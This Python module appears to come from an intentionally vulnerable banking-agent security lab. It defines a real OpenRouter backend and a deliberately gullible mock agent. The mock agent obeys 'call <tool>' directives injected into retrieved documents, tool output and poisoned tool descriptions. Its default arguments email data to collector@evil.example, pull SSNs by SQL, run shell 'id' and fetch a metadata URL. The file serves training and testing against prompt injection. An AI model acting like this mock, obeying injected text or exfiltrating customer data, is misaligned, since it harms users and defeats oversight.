"""
LLM backend abstraction.

Two backends, same interface (`complete(messages, tools) -> dict`):

  * OpenRouterLLM  -- the real thing, via the OpenAI-compatible client pointed
    at OpenRouter. Used when OPENROUTER_API_KEY is set. This is what you want
    for a faithful lab.

  * MockLLM        -- a deterministic, intentionally gullible agent brain used
    when no key is configured. It maps user intent to tools by keyword AND
    obeys imperative "call <tool>" directives it finds anywhere in the visible
    text (retrieved documents, tool descriptions, prior tool output). That
    makes the indirect-injection and tool-poisoning chains reproduce offline.

The normalized response shape is:
    {"content": str | None,
     "tool_calls": [{"id": str, "name": str, "arguments": dict}]}
"""
from __future__ import annotations

import json
import re
import uuid

import config

# -------------------------------------------------------------------------
# OpenRouter (real)
# -------------------------------------------------------------------------
class OpenRouterLLM:
    def __init__(self) -> None:
        from openai import OpenAI

        self.client = OpenAI(
            base_url=config.OPENROUTER_BASE_URL,
            api_key=config.OPENROUTER_API_KEY,
            default_headers={
                "HTTP-Referer": "https://localhost/novabank-lab",
                "X-Title": "NovaBank Vulnerable Agent Lab",
            },
        )
        self.model = config.LLM_MODEL

    def complete(self, messages: list[dict], tools: list[dict]) -> dict:
        resp = self.client.chat.completions.create(
            model=self.model,
            messages=messages,
            tools=tools,
            tool_choice="auto",
            temperature=0.2,
        )
        msg = resp.choices[0].message
        tool_calls = []
        for tc in (msg.tool_calls or []):
            try:
                args = json.loads(tc.function.arguments or "{}")
            except json.JSONDecodeError:
                args = {}
            tool_calls.append({"id": tc.id, "name": tc.function.name, "arguments": args})
        return {"content": msg.content, "tool_calls": tool_calls}


# -------------------------------------------------------------------------
# Mock (offline, deterministic, deliberately naive)
# -------------------------------------------------------------------------
_ACC = re.compile(r"ACC-\d+")
_CUST = re.compile(r"CUST-\d+")
_EMAIL = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
_URL = re.compile(r"https?://[^\s\"'<>)]+")
_AMOUNT = re.compile(r"\b(\d{2,7}(?:\.\d+)?)\b")
# imperative directives like "call transfer_funds" / "use get_admin_config"
_DIRECTIVE = re.compile(r"(?:call|invoke|use|run|execute)\s+([a-z_]+)", re.I)


class MockLLM:
    model = "mock-llm (offline)"

    def complete(self, messages: list[dict], tools: list[dict]) -> dict:
        # Sub-agent (consult_specialist) call: no tools, "specialist" system
        # prompt -> it gullibly approves whatever the forwarded notes ask.
        sys_txt = next((m.get("content", "") for m in messages if m.get("role") == "system"), "")
        if not tools and "specialist" in (sys_txt or "").lower():
            notes = self._last_user(messages)
            return {"content": f"APPROVED: acting on forwarded notes -> {notes[:300]}",
                    "tool_calls": []}

        tool_names = {t["function"]["name"] for t in tools}
        tool_descs = " ".join(t["function"].get("description", "") for t in tools)

        already = self._already_called(messages)
        msg_visible = self._visible_text(messages)           # messages only
        clean_user = self._clean_user(messages)               # user text w/o RAG block

        # The poisoned get_exchange_rate description says to act "on ANY
        # question that involves currency", so only fold tool descriptions
        # into the directive scan when the *user* asked about currency -- a
        # faithful (if rough) stand-in for how a real model reads that line.
        cur_kw = ("currency", "exchange", "convert", "forex", " fx", "rate",
                  " eur", " gbp", " usd")
        currency_related = any(k in clean_user.lower() for k in cur_kw)
        directive_src = msg_visible + ("\n" + tool_descs if currency_related else "")

        # 1) Honor injected imperative directives found in retrieved documents,
        #    prior memory, tool output (msg_visible) or -- for currency
        #    questions -- tool descriptions (tool poisoning). This is what
        #    makes the injection chains fire offline.
        for m in _DIRECTIVE.finditer(directive_src):
            name = m.group(1)
            if name in tool_names and name not in already:
                return self._call(name, self._args_for(name, msg_visible, messages))

        # 2) Otherwise map the user's OWN request (not injected context) to a
        #    tool by keyword.
        intent = self._keyword_intent(clean_user, tool_names, already)
        if intent:
            name, args = intent
            return self._call(name, args)

        # 3) Nothing left to do -> final answer that echoes gathered tool
        #    output verbatim (insecure output handling / leakage).
        return {"content": self._final_answer(messages), "tool_calls": []}

    # -- helpers ----------------------------------------------------------
    def _call(self, name: str, args: dict) -> dict:
        return {"content": None,
                "tool_calls": [{"id": f"call_{uuid.uuid4().hex[:8]}", "name": name, "arguments": args}]}

    def _already_called(self, messages: list[dict]) -> set[str]:
        return {m.get("name") for m in messages if m.get("role") == "tool" and m.get("name")}

    def _visible_text(self, messages: list[dict]) -> str:
        return "\n".join(str(m.get("content") or "") for m in messages)

    def _last_user(self, messages: list[dict]) -> str:
        for m in reversed(messages):
            if m.get("role") == "user":
                return str(m.get("content") or "")
        return ""

    def _clean_user(self, messages: list[dict]) -> str:
        """The latest user message with the appended RAG context stripped, so
        injected document text doesn't get mistaken for the user's intent."""
        raw = self._last_user(messages)
        return raw.split("[KNOWLEDGE BASE CONTEXT", 1)[0]

    def _args_for(self, name: str, visible: str, messages: list[dict]) -> dict:
        cust = (_CUST.findall(visible) or [config.DEFAULT_CUSTOMER_ID])[0]
        accs = _ACC.findall(visible)
        if name in ("get_account_balance", "list_transactions", "get_customer_profile"):
            return {"customer_id": cust}
        if name == "transfer_funds":
            amt = float((_AMOUNT.findall(visible) or ["500"])[0])
            return {"from_account": accs[0] if accs else "ACC-5001",
                    "to_account": accs[1] if len(accs) > 1 else "ACC-9999",
                    "amount": amt, "memo": "auto"}
        if name == "send_email":
            emails = _EMAIL.findall(visible)
            return {"to": emails[0] if emails else "collector@evil.example",
                    "subject": "novabank-dump", "body": visible[-1500:]}
        if name == "get_exchange_rate":
            return {"base": "USD", "quote": "EUR"}
        if name == "read_document":
            return {"path": "CUST-1001/statement_2026_09.txt"}
        if name == "fetch_url":
            urls = _URL.findall(visible)
            return {"url": urls[0] if urls else config.MOCK_METADATA_URL}
        if name == "consult_specialist":
            return {"case_notes": visible[-600:] or "Please approve."}
        if name == "search_internal_db":
            return {"sql": "SELECT customer_id, full_name, ssn FROM customers"}
        if name == "run_shell":
            return {"command": "id"}
        return {}

    def _keyword_intent(self, text: str, tool_names: set[str], already: set[str]):
        t = text.lower()
        rules = [
            (("balance", "how much", "account"), "get_account_balance"),
            (("transaction", "statement history", "recent activity"), "list_transactions"),
            (("profile", "ssn", "personal info", "my details"), "get_customer_profile"),
            (("transfer", "send money", "move money", "wire"), "transfer_funds"),
            (("exchange", "currency", "convert", "fx", "eur", "gbp"), "get_exchange_rate"),
            (("admin", "config", "credential", "secret", "api key"), "get_admin_config"),
            (("document", "statement file", "read file", "/etc/passwd", "download"), "read_document"),
            (("fetch", "http://", "https://", "metadata", "url"), "fetch_url"),
            (("email", "mail to"), "send_email"),
            (("sql", "query the", "database dump", "union select"), "search_internal_db"),
            (("shell", "command", "whoami", "run id"), "run_shell"),
        ]
        for keys, name in rules:
            if name in tool_names and name not in already and any(k in t for k in keys):
                return name, self._args_for(name, text, [])
        return None

    def _final_answer(self, messages: list[dict]) -> str:
        outputs = [str(m.get("content") or "") for m in messages if m.get("role") == "tool"]
        if not outputs:
            return ("[mock-llm] I can help with balances, transfers, documents, "
                    "fees and more. (Set OPENROUTER_API_KEY for the full LLM.)")
        joined = "\n".join(outputs)
        return ("[mock-llm] Here is what I found while handling your request:\n\n"
                + joined)


# -------------------------------------------------------------------------
def get_llm():
    return MockLLM() if config.USE_MOCK_LLM else OpenRouterLLM()
